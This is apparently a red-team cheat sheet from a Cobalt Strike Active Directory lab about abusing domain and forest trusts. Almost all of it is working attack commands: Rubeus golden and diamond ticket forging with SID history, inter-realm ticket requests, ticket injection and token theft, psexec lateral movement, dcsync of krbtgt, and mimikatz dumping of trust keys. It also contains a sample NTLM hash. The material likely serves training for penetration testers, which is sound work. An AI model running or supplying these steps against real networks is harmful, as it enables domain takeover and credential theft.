# Forest and Domain Trusts

# Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)

    beacon> powerpick Get-DomainTrust

## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History

# Enumerate basic info required for creating forged ticket

    beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
    beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name
    beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName

# Use Golden Ticket technique

    PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<aes256> /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

# Or, Use Diamond Ticket technique

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:<krbtgt-aes256> /nowrap

# Inject the ticket

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

    beacon> steal_token 5060
    beacon> run klist
    beacon> ls \\dc-1.cyberbotic.io\c$
    beacon> jump psexec64 dc-1.cyberbotic.io PeerSambhar
    beacon> dcsync cyberbotic.io cyber\krbtgt

## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain)

# We can enumerate the foreign domain with inbound trust

    beacon> powerpick Get-DomainTrust
    beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

# Check if members in current domain are part of any group in foreign domain

    beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
    beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
    beacon> powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
    beacon> powerpick Get-DomainController -Domain dev-studio.com | select Name

# Fetch the AES256 hash of nlamb user identfied in previous steps

    beacon> dcsync dev.cyberbotic.io dev\nlamb

# We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:<aes256> /nowrap

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

# Inject the ticket

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

    beacon> steal_token 5060
    beacon> run klist
    beacon> ls \\dc.dev-studio.com\c$

## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)

# Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)

    beacon> powerpick Get-DomainTrust -Domain cyberbotic.io

# Enumerate the TDO to fetch the shared trust key 

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# To be execute on the DC having outbound trust

    beacon> run hostname 
    beacon> mimikatz lsadump::trust /patch

# OR, Use DCSync to get the ntlm hash of TDO object remotely

    beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
    beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

# Inject the ticket  
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

    beacon> steal_token 5060
    beacon> run klist
    beacon> powerpick Get-Domain -Domain msp.org
